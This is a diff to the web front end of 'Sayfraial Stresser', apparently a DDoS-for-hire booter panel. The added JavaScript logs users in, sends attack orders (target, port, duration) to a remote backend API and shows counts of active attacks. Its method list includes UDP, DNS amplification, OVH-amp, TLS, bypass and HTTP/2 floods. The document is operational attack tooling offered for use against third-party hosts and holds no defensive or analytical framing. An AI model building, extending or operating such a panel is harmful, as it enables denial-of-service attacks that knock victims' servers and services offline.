@@ -4,13 +4,55 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sayfraial Stresser</title>
-  <link rel="stylesheet" href="style.css"/>
+  <style>
+    body {
+      background: #121212;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      padding: 30px;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+    }
+    .card {
+      background: #1f1f1f;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 6px;
+    }
+    button {
+      background: #00cc66;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .link-small {
+      font-size: 12px;
+      color: #00ccff;
+      text-align: right;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <h1>Sayfraial Stresser</h1>
 
-    <!-- Login Card -->
+    <!-- Login -->
     <div id="login" class="card">
       <h2>Login</h2>
       <input type="text" id="user" placeholder="Username" />
@@ -19,7 +61,7 @@
       <p class="link-small" onclick="showRegister()">Sign up</p>
     </div>
 
-    <!-- Register Card -->
+    <!-- Register -->
     <div id="register" class="card hidden">
       <h2>Register</h2>
       <input type="text" id="regUser" placeholder="Username" />
@@ -29,7 +71,7 @@
       <p class="link-small" onclick="showLogin()">Back to login</p>
     </div>
 
-    <!-- Attack Panel -->
+    <!-- Attack -->
     <div id="attack" class="card hidden">
       <h2>Attack Panel</h2>
       <input type="text" id="target" placeholder="Target URL/IP" />
@@ -61,6 +103,125 @@
     </div>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    const BASE = 'https://hospitable-bravery-production.up.railway.app';
+    let isAdmin = false;
+
+    function login() {
+      const user = document.getElementById('user').value;
+      const pass = document.getElementById('pass').value;
+
+      fetch(BASE + '/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user, pass })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.allowed) return alert('Belum di-approve oleh admin');
+        document.getElementById('login').classList.add('hidden');
+        document.getElementById('attack').classList.remove('hidden');
+        document.getElementById('dashboard').classList.remove('hidden');
+        if (data.isAdmin) {
+          isAdmin = true;
+          document.getElementById('admin').classList.remove('hidden');
+        }
+        loadStats();
+      })
+      .catch(() => alert('Login gagal'));
+    }
+
+    function register() {
+      const user = document.getElementById('regUser').value;
+      const pass = document.getElementById('regPass').value;
+      const captcha = document.getElementById('captcha').value;
+      if (captcha != '7') return alert('Captcha salah');
+
+      fetch(BASE + '/api/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user, pass })
+      })
+      .then(res => res.json())
+      .then(() => alert('Berhasil daftar, tunggu approval admin'))
+      .catch(() => alert('Gagal daftar'));
+    }
+
+    function showRegister() {
+      document.getElementById('login').classList.add('hidden');
+      document.getElementById('register').classList.remove('hidden');
+    }
+
+    function showLogin() {
+      document.getElementById('register').classList.add('hidden');
+      document.getElementById('login').classList.remove('hidden');
+    }
+
+    function loadMethods() {
+      const layer = document.getElementById('layer').value;
+      const method = document.getElementById('method');
+      method.innerHTML = '';
+
+      const methods = {
+        layer4: ["udp", "dns", "tcp", "fivem", "minecraft", "ovh-amp", "vse"],
+        layer7: ["kalimasada", "tls", "trump", "tlsx", "bypass", "h2-blast", "https"]
+      };
+
+      if (methods[layer]) {
+        methods[layer].forEach(m => {
+          const opt = document.createElement('option');
+          opt.value = m;
+          opt.innerText = m.toUpperCase();
+          method.appendChild(opt);
+        });
+      }
+    }
+
+    function sendAttack() {
+      const target = document.getElementById('target').value;
+      const port = document.getElementById('port').value;
+      const time = document.getElementById('time').value;
+      const method = document.getElementById('method').value;
+
+      fetch(BASE + '/api/attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ target, port, time, method })
+      })
+      .then(res => res.json())
+      .then(data => alert('Attack sent: ' + JSON.stringify(data)))
+      .catch(e => alert('Error: ' + e.message));
+    }
+
+    function createUser() {
+      if (!isAdmin) return alert('Bukan admin');
+
+      const newUser = document.getElementById('newUser').value;
+      const newPass = document.getElementById('newPass').value;
+
+      fetch(BASE + '/api/create-user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          adminUser: document.getElementById('user').value,
+          adminPass: document.getElementById('pass').value,
+          newUser, newPass
+        })
+      })
+      .then(res => res.json())
+      .then(() => alert('User created'))
+      .catch(() => alert('Gagal create user'));
+    }
+
+    function loadStats() {
+      fetch(BASE + '/api/stats')
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById('stat-now').innerText = 'Attack Aktif: ' + data.now;
+          document.getElementById('stat-today').innerText = 'Hari Ini: ' + data.today;
+          document.getElementById('stat-month').innerText = 'Bulan Ini: ' + data.month;
+        });
+    }
+  </script>
 </body>
 </html>
